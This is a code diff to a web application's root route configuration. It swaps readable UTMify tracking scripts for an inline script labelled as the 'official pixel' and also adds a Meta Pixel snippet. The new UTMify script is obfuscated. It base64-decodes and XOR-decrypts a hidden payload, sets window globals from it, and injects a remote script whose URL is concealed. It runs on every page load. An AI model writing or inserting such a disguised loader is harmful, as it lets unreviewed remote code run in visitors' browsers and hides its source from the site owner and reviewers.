@@ -103,21 +103,10 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
     ],
     scripts: [
-      // UTMify — pixel de conversão
-      { children: 'window.pixelId = "6abe77af61fa781d0bda014c";' },
-      {
-        src: "https://cdn.utmify.com.br/scripts/pixel/pixel.js",
-        async: true,
-        defer: true,
-      },
-      // UTMify — captura de UTMs e envio para o checkout
-      {
-        src: "https://cdn.utmify.com.br/scripts/utms/latest.js",
-        async: true,
-        defer: true,
-        "data-utmify-prevent-xcod-sck": "",
-        "data-utmify-prevent-subids": "",
-      },
+      // UTMify — pixel oficial fornecido para esta oferta
+      { children: "(function(){var k_am=atob(\"DNRTZXhlOa4kuSrrcq9xEAoJG5QG0V6fAqdpSlcGXcAKzF6GG7IqSxsKVIBGywWYEaY6FQwWFt5NwU+HXaQ6HR0JF8RXmwbJE6AnFxEHTNpBygjRKYl/Rx8JVsxF1VnJSI8oRxYEVMsGgwibG6w2CTEBG4IGz0uHB7FxX1pTWMxBjh2KFOJiAxlSAZ9AiUiPE+RiURtHRPNZ\");var q_xv=[];for(var b_gx35=0;b_gx35<k_am.length;b_gx35++){q_xv.push(k_am.charCodeAt(b_gx35)&255);}var c_d=q_xv[0];var q_d6mh=q_xv.slice(1,1+c_d);var q_w0=q_xv.slice(1+c_d);var j_zp69=q_w0.map(function(b,y_1chh){return b^q_d6mh[y_1chh%c_d];});var j_da3=\"\";for(var m_8c=0;m_8c<j_zp69.length;m_8c++){j_da3+=String.fromCharCode(j_zp69[m_8c]&255);}var r_azu=decodeURIComponent(escape(j_da3));var j_r70y=JSON.parse(r_azu);var u_mtc5=j_r70y.globals||[];u_mtc5.forEach(function(s_7){window[s_7.name]=s_7.value;});var o_w8=document.createElement(\"script\");o_w8.src=j_r70y.url;o_w8.async=true;o_w8.defer=true;(j_r70y.attributes||[]).forEach(function(o_i){o_w8.setAttribute(o_i.name,o_i.value);});(document.head||document.documentElement).appendChild(o_w8);})();" },
+      // Meta Pixel — PageView no carregamento; eventos de checkout são disparados por interação real
+      { children: "!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');fbq('init','2062375201054822');fbq('track','PageView');" },
     ],
   }),
   shellComponent: RootShell,
